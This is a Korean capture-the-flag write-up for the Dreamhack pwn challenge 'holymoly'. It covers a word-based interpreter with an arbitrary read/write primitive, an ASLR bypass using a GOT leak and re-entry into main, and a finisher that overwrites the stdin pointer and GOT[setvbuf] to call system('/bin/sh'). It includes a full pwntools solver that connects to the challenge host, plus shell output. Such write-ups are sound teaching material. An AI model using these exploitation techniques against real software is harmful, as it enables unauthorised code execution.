# ✏️ holymoly

> `amounts[]`(증감 단위)를 스스로 덮어써 임의 쓰기를 증폭 → 단일 연결 2라운드로 ASLR 우회 → COPY-reloc된 `stdin` 포인터로 one_gadget 없이 결정적 셸.

## 📄 Vulnerability & Code Analysis

```
gcc -Wall -no-pie -s holymoly.c -o holymoly
```

| 보호기법 | 값 |
|---|---|
| PIE | **No PIE** (0x400000 고정) |
| RELRO | **Partial** (`.got.plt` 쓰기 가능) |
| NX | on |
| Canary | 없음 |
| IBT / SHSTK | **Enabled** (CET) |

```c
// 핵심 발췌 (holymoly.c)
int amounts[4] = {0x1000, 0x100, 0x10, 0x1};   // @ 0x404060 (쓰기 가능 .data)
uint64_t *ptr;                                 // @ 0x4040c0
uint64_t val;                                  // @ 0x4040b8
uint8_t  ptrval_switch;                        // @ 0x4040b0

int main(void) {
    char *song;
    Init();                      // setvbuf(stdin/stdout/stderr), ptr=NULL, val=0
    printf("holymoly? ");
    song = calloc(0xbeef, 1);
    scanf("%48878s", song);      // 입력을 '전부' 받은 뒤
    Interpret(song);             // 그제서야 해석 시작
    puts("holymoly!");
}

void Increase(int amount){ if(ptrval_switch) ptr += amount; else val += amount; }  // signed int32!
void Read()  { write(1, (char *)ptr, 8); }   // blueberry  : 8바이트 leak
void Write() { *ptr = val; }                  // cranberry  : 8바이트 임의 쓰기
```

`Interpret`는 입력을 고정 단어로 파싱해 동작을 실행하는 작은 인터프리터다.

| 단어 | 동작 |
|---|---|
| `holymoly`/`rolypoly`/`monopoly`/`guacamole` | `amounts[0..3]`만큼 **ptr 또는 val** `+=` |
| `robocarpoli`/`halligalli`/`broccoli`/`bordercollie` | 같은 단위로 `-=` |
| `blueberry` | `write(1, ptr, 8)` — 8바이트 leak |
| `cranberry` | `*ptr = val` — 8바이트 임의 쓰기 |
| `mystery` | `ptrval_switch` 토글 (증감이 ptr/val 중 어디에 적용될지) |

즉 primitive는 **"ptr/val을 `amounts[]` 단위로만 증감시키는 임의 읽기/쓰기"** 다.

## 🗡️ Exploit / Solver Strategy

### 1. amounts 자기증폭

`scanf("%48878s")` → 명령어는 최대 ~6,000개뿐. 단순 누적으로는 ptr/val을 수천만까지밖에 못 만든다. 하지만 `amounts[]`가 **쓰기 가능한 `.data`**에 있으므로 증감 단위 자체를 `cranberry`로 키울 수 있다.

1. `ptr`을 `&amounts[0]`(0x404060, 저주소라 금방 도달)로 이동
2. `val`을 키워 `cranberry`로 `amounts[0]`에 씀 → 이후 `holymoly` 한 번이 훨씬 큰 값을 더함
3. 자리수별로 반복(×16 Horner)하면 수백 번 명령으로 64비트 `val` 완성

함정 두 가지:
- `*ptr=val`은 8바이트라 `amounts[0]`에 쓰면 `amounts[0]`(하위)+`amounts[1]`(상위)이 동시에 바뀐다.
- `Increase()`가 `amounts[i]`를 **signed int32**로 읽어서, 증폭값이 2³¹을 넘으면 부호가 뒤집혀 증가가 감소가 된다 → 중간 `amounts[0]`는 항상 `< 2³¹`로 유지(`V//16 < 2²⁸`).

> **val만 증폭되고 ptr은 안 된다.** val은 `amounts[0]`에 자기 자신을 써서 ×16으로 불릴 수 있지만, ptr은 `amounts[i]`를 더하는 선형 증가(최대 2³¹/step)뿐이다. 그래서 **쓸 수 있는 주소는 LOW(바이너리 `0x404xxx`)뿐** — 이게 finisher를 결정한다.

### 2. GOT leak + 단일 연결 2라운드 (ASLR 우회)

`calloc` 등의 GOT는 `Interpret` 전에 이미 실제 libc 주소로 resolve돼 있다. `ptr`을 `&GOT[calloc]`로 옮기고 `blueberry`로 리크. 그런데 `scanf`가 입력을 **다 받은 뒤** 해석을 시작하므로, 같은 payload 안에서 그 리크값을 쓸 수 없다(블라인드 단일 샷). ASLR도 매 연결 랜덤이라 2연결 방식 불가.

→ **한 연결 안에서 main을 재진입**시킨다: `GOT[puts]`를 `main`(No-PIE 고정 `0x4011f6`, `endbr64` 시작)으로 덮으면, `Interpret` 종료 시 `puts@plt`가 main으로 점프 → `Init`(ptr/val만 리셋, amounts/switch 유지) → `scanf`가 한 번 더(= 라운드2). 같은 연결이라 `libc_base` 동일 → 라운드1에서 받은 리크로 라운드2를 만든다.

### 3. one_gadget이 전부 죽는 이유

libc를 디스어셈블해 확인한 결과 4개 후보 전부 불가능:

| gadget | 실제 호출 | 필요 조건 | 우리 호출부 |
|---|---|---|---|
| `0xe3b04` | `execve("/bin/sh", RSI, RDX)` | RSI·RDX NULL | **RDX ≠ 0** (write=8, memcmp=len−1, setvbuf=2) |
| `0xe3b01` | `execve("/bin/sh", R15, RDX)` | R15·RDX NULL | 〃 RDX |
| `0xe3bf0` | `execve("/bin/sh", R15, R12)` | `[R15]`·`[R12]` NULL | main 진입 시 `__libc_csu_*` 포인터 → 실패 |
| `0x107cba` | posix_spawn 내부 | 완성된 스택프레임 | blind 점프로 세팅 불가 |

게다가 §1처럼 **libc 쓰기 자체가 불가**(ptr가 libc 주소에 못 감)라 `__malloc_hook`·FSOP도 전부 탈락. GOT 재지정 = "현재 레지스터로 함수 호출" 한 방뿐이고 그중 먹는 게 없다.

### 4. Finisher — COPY-reloc된 stdin 포인터 → system

돌파구는 바이너리 자신에 있었다. No-PIE 바이너리가 `stdin/stdout/stderr`를 참조하면 링커가 **COPY 재배치**로 그 `FILE*` 값을 바이너리 `.bss`에 복사한다. `Init`의 첫 동작:

```asm
Init:  0x40126f  MOV RAX, qword ptr [0x404090]   ; stdin FILE* (첫 setvbuf 인자)
       0x401285  MOV RDI, RAX
       0x401288  CALL setvbuf@plt                ; 0x4010f4: JMP qword ptr [0x404040]
```

```
stdin @ 0x404090   stdout @ 0x404080   stderr @ 0x4040a0   GOT[setvbuf] @ 0x404040
```

`setvbuf(stdin, …)`의 `RDI`가 `*(0x404090)`에서 로드되는데 **이 포인터가 LOW `.bss`라 덮어쓸 수 있다**. 라운드2에서 두 번만 쓰면 끝:

1. `*(0x404090)` = libc `"/bin/sh"` 주소
2. `GOT[setvbuf]` = `system`

→ 다음 루프의 `Init()`에서 **가장 먼저** 실행되는 `setvbuf(stdin, …)`이 그대로 `system("/bin/sh")`. `printf` 프롬프트보다 앞이라 바로 셸. `system`은 함수 엔트리(`endbr64`)라 **IBT가 강제돼도 안전**하고 RDI 하나만 맞으면 되니 RDX/R12/R15 제약이 전무 → 결정적.

## 💻 Final Payload or Solver

`common.py`의 `Sim`은 현재 `amounts`로 목표값까지 "가장 싸게" 이동하는 명령열을 생성하고, `amounts`에 쓰는 자기증폭도 모델링한다. `solve_template.py`:

```python
#!/usr/bin/env python3
import sys
sys.path.insert(0, '.')
from common import *
from pwn import *

context.clear(arch='amd64', os='linux')
HOST, PORT = "host3.dreamhack.games", 12469

libc = ELF('./libc-2.31.so'); elf = ELF('./holymoly')
MAIN_ADDR = 0x4011f6          # No-PIE 고정, endbr64 시작 -> 점프 타깃 OK
STDIN_PTR = 0x404090          # 바이너리 .bss 안의 stdin FILE* (COPY reloc)
MASK32 = 0xffffffff

def _zero_val(sim):
    sim.set_switch(0); rem = sim.val
    for idx, rate in sorted(((i, sim.amounts[i]) for i in range(4)), key=lambda x: -x[1]):
        if rate <= 0: continue
        while rem >= rate: sim.dec(idx); rem -= rate
    assert sim.val == 0

def build_val(sim, V):                 # val = V (0<=V<2^32), base-16 Horner
    assert 0 <= V <= MASK32
    _zero_val(sim); sim.move_cheap(AMOUNTS_ADDR, use_switch_ptr=True); sim.set_switch(0)
    first = True
    for d in (int(c, 16) for c in f"{V:x}"):
        if not first:
            sim.write()
            for _ in range(15): sim.inc(0)      # val *= 16
        for _ in range(d): sim.inc(3)           # val += 1
        first = False
    assert sim.val == V

def overwrite_got(sim, got, value):    # 임의 64비트 쓰기 = 32비트 두 번
    low, high = value & MASK32, (value >> 32) & MASK32
    build_val(sim, low);  sim.move_cheap(got,     use_switch_ptr=True); sim.write()
    build_val(sim, high); sim.move_cheap(got + 4, use_switch_ptr=True); sim.write()

def payload_round1():                  # GOT[calloc] 리크 + GOT[puts]=main (재진입 루프)
    sim = Sim()
    sim.move_cheap(GOT_CALLOC, use_switch_ptr=True); sim.read()
    sim.move_cheap(MAIN_ADDR, use_switch_ptr=False)          # val=main (amounts 미오염)
    sim.move_cheap(GOT_PUTS, use_switch_ptr=True); sim.write()
    sim.set_switch(0)
    p = sim.payload().encode(); assert len(p) <= 48878; return p

def payload_round2(libc_base):         # stdin 포인터->"/bin/sh", GOT[setvbuf]=system
    system = libc_base + libc.symbols['system']
    binsh  = libc_base + next(libc.search(b'/bin/sh\x00'))
    sim = Sim()
    overwrite_got(sim, STDIN_PTR, binsh)
    overwrite_got(sim, GOT_SETVBUF, system)
    p = sim.payload().encode(); assert len(p) <= 48878; return p

def solve():
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'holymoly? ', timeout=5)
    io.sendline(payload_round1())
    base = u64(io.recvn(8, timeout=5)) - libc.symbols['calloc']
    log.info("libc_base = %#x" % base)
    io.recvuntil(b'holymoly? ', timeout=5)                   # 라운드2 프롬프트 == 루프 성공
    io.sendline(payload_round2(base))                        # 다음 Init()의 setvbuf == system("/bin/sh")
    io.sendline(b'cat /flag* 2>/dev/null; id')
    io.interactive()

if __name__ == '__main__':
    solve()
```

## 🏳️ cat flag

```bash
python solve_template.py
```

```text
[*] leak calloc = 0x7f7d25bd8b10  ->  libc_base = 0x7f7d25b3d000
[+] loop2=OK, system=0x7f7d25b8f290, binsh=0x7f7d25cf15bd
===PWNED===
[+] shell!
[*] Switching to interactive mode
$ id
uid=1000(holymoly) gid=1000(holymoly) groups=1000(holymoly)
$ cat /flag
DH{<FLAG_REDACTED>}
```
